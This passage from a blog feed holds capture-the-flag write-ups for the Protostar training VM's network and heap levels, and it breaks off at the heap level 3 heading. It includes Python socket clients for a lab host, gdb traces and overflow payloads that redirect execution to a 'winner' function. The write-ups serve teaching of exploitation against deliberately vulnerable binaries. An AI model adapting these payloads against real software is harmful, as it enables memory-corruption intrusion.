-</span><span class='line'>    print e
-</span><span class='line'>finally:
-</span><span class='line'>    sock.close()</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And when ran:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># python protostar_net0.py 
-</span><span class='line'>Swapping 1295208340 to little endian 32bit int
-</span><span class='line'>Swapped to '\x94O3M\x00\x00\x00\x00'
-</span><span class='line'>Thank you sir/madam</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Network 01</h2>
-
-<p>This stage simply requires us to unpack an unsigned integer:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'> unsigned int wanted;
-</span><span class='line'>
-</span><span class='line'>  wanted = random();
-</span><span class='line'>
-</span><span class='line'>  sprintf(fub, "%d", wanted);
-</span><span class='line'>
-</span><span class='line'>  if(write(0, &wanted, sizeof(wanted)) != sizeof(wanted)) {
-</span><span class='line'>      errx(1, ":(\n");
-</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Trivially accomplished with some struct packing:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>import socket
-</span><span class='line'>import struct
-</span><span class='line'>
-</span><span class='line'>try:
-</span><span class='line'>    sock = socket.socket()
-</span><span class='line'>    sock.connect(('192.168.1.106', 2998))
-</span><span class='line'>
-</span><span class='line'>    data = sock.recv(256)
-</span><span class='line'>
-</span><span class='line'>    swapped = str(struct.unpack('&lt;I', data)[0])
-</span><span class='line'>    print swapped
-</span><span class='line'>    sock.sendall(swapped + '\r\n')
-</span><span class='line'>    print sock.recv(256)
-</span><span class='line'>except Exception, e:
-</span><span class='line'>    print e
-</span><span class='line'>finally:
-</span><span class='line'>    sock.close()</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Which gives us:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># python protostar_net1.py 
-</span><span class='line'>1413209085
-</span><span class='line'>you correctly sent the data</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Network 02</h2>
-
-<p>The third network level tasks us with reading in 4 unsigned integers, adding them together, and sending back the result.  The &ldquo;trick&rdquo; in this stage, if you will, is that uint32 arithmetic needs to take into account wrapping.  To accomplish this, we want our result to never be negative, which requires us to define the result modulo 2<sup>n</sup>, where n = bit length.</p>
-
-<p>This makes for a pretty simple stage:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>import struct
-</span><span class='line'>import socket
-</span><span class='line'>
-</span><span class='line'>try:
-</span><span class='line'>    sock = socket.socket()
-</span><span class='line'>    sock.connect(('192.168.1.106', 2997))
-</span><span class='line'>
-</span><span class='line'>    # read in our four numbers
-</span><span class='line'>    total = 0
-</span><span class='line'>    for i in xrange(4):
-</span><span class='line'>        n = sock.recv(4)
-</span><span class='line'>        n = struct.unpack('&lt;I', n)[0]
-</span><span class='line'>        print 'Read digit %d' % n
-</span><span class='line'>        total += n
-</span><span class='line'>
-</span><span class='line'>    total = total & 0xffffffffL
-</span><span class='line'>    total = struct.pack('&lt;I', total)
-</span><span class='line'>    sock.sendall(total)
-</span><span class='line'>    print sock.recv(256)
-</span><span class='line'>except Exception, e:
-</span><span class='line'>    print e
-</span><span class='line'>finally:
-</span><span class='line'>    sock.close()</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Note that we AND the final result by 2<sup>n</sup>, ensuring we have a positive 32 bit value.</p>
-
-<p>When run:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># python protostar_net2.py 
-</span><span class='line'>Read digit 1533721612
-</span><span class='line'>Read digit 363484815
-</span><span class='line'>Read digit 1200915436
-</span><span class='line'>Read digit 1572177737
-</span><span class='line'>you added them correctly
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Network 03</h2>
-
-<p>The most enjoyable of the four levels, this stage requires us to reverse a dead simple login routine and perform the login.  We&rsquo;ll start by checking out the code and figuring out what it&rsquo;s doing:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>while(1) {
-</span><span class='line'>
-</span><span class='line'>      // from the connection, read in the total length of the packet, then
-</span><span class='line'>      // parse with ntohs and allocate the buffer with malloc
-</span><span class='line'>      nread(fd, &len, sizeof(len));
-</span><span class='line'>      len = ntohs(len);
-</span><span class='line'>      buffer = malloc(len);
-</span><span class='line'>
-</span><span class='line'>      if(! buffer) errx(1, "malloc failure for %d bytes", len);
-</span><span class='line'>
-</span><span class='line'>      // read in LEN bytes into BUFFER
-</span><span class='line'>      nread(fd, buffer, len);</span></code></pre></td></tr></table></div></figure>
-
-
-<p>I&rsquo;ve commented the code inline to ease understanding.  Essentially, the first byte of our packet must be the total length of the packet.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>  // switch on the first byte of the buffer
-</span><span class='line'>  switch(buffer[0]) {
-</span><span class='line'>          // if the first byte is \x17, initiate login routine
-</span><span class='line'>          case 23:
-</span><span class='line'>              // invoke login() with buffer + 1 (skip length byte) and total len - 1 of the packet
-</span><span class='line'>              loggedin = login(buffer + 1, len - 1);
-</span><span class='line'>              send_string(fd, 33, loggedin ? "successful" : "failed");
-</span><span class='line'>              break;
-</span><span class='line'>          
-</span><span class='line'>          default:
-</span><span class='line'>              send_string(fd, 58, "what you talkin about willis?");
-</span><span class='line'>              break;
-</span><span class='line'>      }</span></code></pre></td></tr></table></div></figure>
-
-
-<p>If the first byte of the buffer (second in the packet) is \x17, it initiates login.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>  deduct = get_string(&resource, buffer, len);
-</span><span class='line'>  deduct += get_string(&username, buffer+deduct, len-deduct);
-</span><span class='line'>  deduct += get_string(&password, buffer+deduct, len-deduct);
-</span><span class='line'>
-</span><span class='line'>  success = 0;
-</span><span class='line'>  success |= strcmp(resource, "net3");
-</span><span class='line'>  success |= strcmp(username, "awesomesauce");
-</span><span class='line'>  success |= strcmp(password, "password");</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Here&rsquo;s the real meat of the login routine; we need three, null-terminated strings that match &ldquo;net3&rdquo;, &ldquo;awesomesauce&rdquo;, and &ldquo;password&rdquo;, respectively, to successfully authenticate to the application.  The <code>get_string</code> fuction pulls these strings out one by one:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>  unsigned char byte;
-</span><span class='line'>
-</span><span class='line'>  byte = *buffer;
-</span><span class='line'>
-</span><span class='line'>  // if it's malformed, i.e. not null term'd
-</span><span class='line'>  if(byte &gt; len) errx(1, "badly formed packet");
-</span><span class='line'>
-</span><span class='line'>  // malloc size of byte, which is the first byte at the start of the buffer
-</span><span class='line'>  *result = malloc(byte);
-</span><span class='line'>
-</span><span class='line'>  // strcpy buffer + 1 into the result pointer location
-</span><span class='line'>  strcpy(*result, buffer + 1);
-</span><span class='line'>
-</span><span class='line'>  // return number of bytes read
-</span><span class='line'>  return byte + 1;</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The caveat here is that we need to prepend the string length to each entry, then null terminate it.  This was quite simple to hack up, once it&rsquo;d been reversed:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>import struct
-</span><span class='line'>import socket
-</span><span class='line'>
-</span><span class='line'>IP = '192.168.1.106'
-</span><span class='line'>PORT = 2996
-</span><span class='line'>
-</span><span class='line'>try:
-</span><span class='line'>    sock = socket.socket()
-</span><span class='line'>    sock.connect((IP, PORT))
-</span><span class='line'>
-</span><span class='line'>    resource = "net3\x00"
-</span><span class='line'>    username = "awesomesauce\x00"
-</span><span class='line'>    password = "password\x00"
-</span><span class='line'>
-</span><span class='line'>    # build login packet 
-</span><span class='line'>    packet = struct.pack('B', 23)
-</span><span class='line'>    packet += struct.pack('B', len(resource)) + resource
-</span><span class='line'>    packet += struct.pack('B', len(username)) + username
-</span><span class='line'>    packet += struct.pack('B', len(password)) + password
-</span><span class='line'>    packet_len = struct.pack('&gt;H', len(packet))
-</span><span class='line'>
-</span><span class='line'>    print '[!] Sending packet (%d)' % (len(packet) + len(packet_len))
-</span><span class='line'>
-</span><span class='line'>    sock.sendall(packet_len + packet)
-</span><span class='line'>
-</span><span class='line'>    print sock.recv(128)
-</span><span class='line'>
-</span><span class='line'>except Exception, e:
-</span><span class='line'>    print e
-</span><span class='line'>finally:
-</span><span class='line'>    sock.close()</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Note that we&rsquo;re sending the packet length big endian due to the <code>ntohs</code> call returning a little endian value.  And once run:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># python protostar_net3.py 
-</span><span class='line'>[!] Sending packet (33)
-</span><span class='line'>
-</span><span class='line'>!successful</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Network 04</h2>
-
-<p>Although net04 is not listed anywhere on the site, I noticed that it was both running and available in the <code>/opt/protostar/bin</code> directory.  Disassembling it reveals the answer:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'> 80497a8:   e8 ff f3 ff ff          call   8048bac &lt;srandom@plt&gt;
-</span><span class='line'> 80497ad:   8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
-</span><span class='line'> 80497b1:   89 04 24                mov    DWORD PTR [esp],eax
-</span><span class='line'> 80497b4:   e8 a1 ff ff ff          call   804975a &lt;run&gt;</span></code></pre></td></tr></table></div></figure>
-
-
-<p><main> does exactly what the rest of the stages have done: backgrounding the process as the current user, serving the socket up indefinitely, changing STDIO, and invoking run().  However, stage fours run is a big nop:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>0804975a &lt;run&gt;:
-</span><span class='line'> 804975a:   55                      push   ebp
-</span><span class='line'> 804975b:   89 e5                   mov    ebp,esp
-</span><span class='line'> 804975d:   5d                      pop    ebp
-</span><span class='line'> 804975e:   c3                      ret  </span></code></pre></td></tr></table></div></figure>
-
-
-<p>Not so much of a stage!  On to the final stages.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Protostar solutions - Heap Exploitation]]></title>
-    <link href="http://hatRiot.github.io/blog/2014/09/21/protostar-heap-exploits/"/>
-    <updated>2014-09-21T14:10:04-07:00</updated>
-    <id>http://hatRiot.github.io/blog/2014/09/21/protostar-heap-exploits</id>
-    <content type="html"><![CDATA[<p>And we&rsquo;re back with Protostar, this time working on the heap section.</p>
-
-<h2>Heap Exploits 0</h2>
-
-<p>Introductory level that demonstrates overflowing heap structures.  It&rsquo;s pretty simple:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ objdump -dt heap0 | grep winner
-</span><span class='line'>08048464 g     F .text  00000014              winner
-</span><span class='line'>08048478 g     F .text  00000014              nowinner
-</span><span class='line'>08048464 &lt;winner&gt;:
-</span><span class='line'>08048478 &lt;nowinner&gt;:</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And then we find our EIP offset:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*72 + "B"*4')
-</span><span class='line'>Starting program: /opt/protostar/bin/heap0 $(python -c 'print "A"*72 + "B"*4')
-</span><span class='line'>data is at 0x804a008, fp is at 0x804a050
-</span><span class='line'>
-</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
-</span><span class='line'>0x42424242 in ?? ()</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Using our mad exploit skills:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./heap0 $(python -c 'print "A"*72 + "\x64\x84\x04\x08"')
-</span><span class='line'>data is at 0x804a008, fp is at 0x804a050
-</span><span class='line'>level passed</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Heap Exploits 1</h2>
-
-<p>This challenge dives a bit more into heap exploitation with a nice write-what-where, and the goal is to redirect execution flow to the function <code>winner</code>.  Let&rsquo;s find that first:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ objdump -dt heap1 | grep winner
-</span><span class='line'>08048494 g     F .text  00000025              winner</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Now let&rsquo;s check out the actual bug:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*20 + "B"*4') xx
-</span><span class='line'>The program being debugged has been started already.
-</span><span class='line'>Start it from the beginning? (y or n) y
-</span><span class='line'>Starting program: /opt/protostar/bin/heap1 $(python -c 'print "A"*20 + "B"*4') xx
-</span><span class='line'>
-</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
-</span><span class='line'>*__GI_strcpy (dest=0x42424242 &lt;Address 0x42424242 out of bounds&gt;, src=0xbffff9a3 "xx") at strcpy.c:40
-</span><span class='line'>40  strcpy.c: No such file or directory.
-</span><span class='line'>    in strcpy.c</span></code></pre></td></tr></table></div></figure>
-
-
-<p>As we can see, we control the source (argument two) and the destination, address one, which is the result of a pointer overflow in the following code:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>strcpy(i1-&gt;name, argv[1]);
-</span><span class='line'>strcpy(i2-&gt;name, argv[2]);</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We have a couple of options for exploitation, but I chose to simply overwrite ebp+4 to take control over the return address.  Let&rsquo;s find that first:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) b *0x08048566
-</span><span class='line'>Breakpoint 1 at 0x8048566: file heap1/heap1.c, line 35.
-</span><span class='line'>(gdb) r xx yy
-</span><span class='line'>Starting program: /opt/protostar/bin/heap1 xx yy
-</span><span class='line'>and that's a wrap folks!
-</span><span class='line'>
-</span><span class='line'>Breakpoint 1, main (argc=3, argv=0xbffff864) at heap1/heap1.c:35
-</span><span class='line'>35  heap1/heap1.c: No such file or directory.
-</span><span class='line'>    in heap1/heap1.c
-</span><span class='line'>(gdb) x/wx $ebp
-</span><span class='line'>0xbffff7b8: 0xbffff838</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This shows ebp is located at 0xbffff7b8, so let&rsquo;s overwrite that:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*20 + "\x98\xf7\xff\xbf"') $(python -c 'print "A"*4 + "B"*4')
-</span><span class='line'>The program being debugged has been started already.
-</span><span class='line'>Start it from the beginning? (y or n) y
-</span><span class='line'>Starting program: /opt/protostar/bin/heap1 $(python -c 'print "A"*20 + "\x98\xf7\xff\xbf"') $(python -c 'print "A"*4 + "B"*4')
-</span><span class='line'>and that's a wrap folks!
-</span><span class='line'>
-</span><span class='line'>Breakpoint 1, main (argc=0, argv=0xbffff844) at heap1/heap1.c:35
-</span><span class='line'>35  in heap1/heap1.c
-</span><span class='line'>(gdb) x/wx $ebp
-</span><span class='line'>0xbffff798: 0x41414141
-</span><span class='line'>(gdb) x/wx $ebp+4
-</span><span class='line'>0xbffff79c: 0x42424242
-</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>
-
-
-<p>Note that ebp&rsquo;s address changed; this is a stupid method and is susceptible to stack shifting, so we need to ensure we accomodate for that.  Anyway, now we can control where we return to, so let&rsquo;s pop in our winning address:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*20 + "\x98\xf7\xff\xbf"') $(python -c 'print "A"*4 + "\x94\x84\x04\x08"')
-</span><span class='line'>
-</span><span class='line'>Breakpoint 1, main (argc=0, argv=0xbffff844) at heap1/heap1.c:35
-</span><span class='line'>35  in heap1/heap1.c
-</span><span class='line'>(gdb) x/wx $ebp
-</span><span class='line'>0xbffff798: 0x41414141
-</span><span class='line'>(gdb) x/wx $ebp+4
-</span><span class='line'>0xbffff79c: 0x08048494
-</span><span class='line'>(gdb) c
-</span><span class='line'>Continuing.
-</span><span class='line'>and we have a winner @ 1410933753
-</span><span class='line'>
-</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
-</span><span class='line'>0x00000000 in ?? ()
-</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>
-
-
-<p>And that&rsquo;s all!  Notice we still segfault, this is because we&rsquo;ve totally screwed up the stack, and it&rsquo;s trying to pop another value off the stack and return there.  We can trivally fix that by appending the address for exit:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*20 + "\x98\xf7\xff\xbf"') $(python -c 'print "A"*4 + "\x94\x84\x04\x08" + "\xc0\x60\xec\xb7"')
-</span><span class='line'>Starting program: /opt/protostar/bin/heap1 $(python -c 'print "A"*20 + "\x98\xf7\xff\xbf"') $(python -c 'print "A"*4 + "\x94\x84\x04\x08" + "\xc0\x60\xec\xb7"')
-</span><span class='line'>and that's a wrap folks!
-</span><span class='line'>and we have a winner @ 1410933890
-</span><span class='line'>
-</span><span class='line'>Program exited with code 0124.
-</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Heap Exploits 2</h2>
-
-<p>This one is pretty simple, and doesn&rsquo;t require us to really exploit much.  What we have is basically a contrived authentication service that&rsquo;s got four commands: auth, reset, service, and login.  The goal is to trigger the &ldquo;you have logged in already!&rdquo; message.  Here&rsquo;s the solution:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ./heap2
-</span><span class='line'>[ auth = (nil), service = (nil) ]
-</span><span class='line'>auth xx
-</span><span class='line'>[ auth = 0x804c008, service = (nil) ]
-</span><span class='line'>service xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]
-</span><span class='line'>login
-</span><span class='line'>you have logged in already!
-</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]</span></code></pre></td></tr></table></div></figure>
-
-
-<p>First we auth, which allocates the auth structure:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>if(strncmp(line, "auth ", 5) == 0) {
-</span><span class='line'>  auth = malloc(sizeof(auth));
-</span><span class='line'>  memset(auth, 0, sizeof(auth));
-</span><span class='line'>  if(strlen(line + 5) &lt; 31) {
-</span><span class='line'>    strcpy(auth-&gt;name, line + 5);
-</span><span class='line'>  }
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Then we execute service with a long string:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>if(strncmp(line, "service", 6) == 0) {
-</span><span class='line'>      service = strdup(line + 7);
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<p>strdup duplicates a string, allocated via malloc.  Note in the auth struct allocation that it&rsquo;s only allocating <code>sizeof(auth)</code>.  This is an incorrect allocation, as it&rsquo;s really just allocating memory for a struct <em>pointer</em>, and not the 30 odd bytes for the structure.  We can easily demonstrate this with multiple auth struct allocations:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./heap2
-</span><span class='line'>[ auth = (nil), service = (nil) ]
-</span><span class='line'>auth 1 
-</span><span class='line'>[ auth = 0x804c008, service = (nil) ]
-</span><span class='line'>auth 2
-</span><span class='line'>[ auth = 0x804c018, service = (nil) ]</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This 16 byte difference is comprised solely of chunk headers.  All we need to do is set the auth flag in the struct to some non-zero value, which can be done with the service command and our arbitrarily long string allocation.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>if(strncmp(line, "login", 5) == 0) {
-</span><span class='line'>    if(auth-&gt;auth) {
-</span><span class='line'>      printf("you have logged in already!\n");
-</span><span class='line'>    } else {
-</span><span class='line'>      printf("please enter your password\n");
-</span><span class='line'>    }
-</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Heap Exploits 3</h2>
-
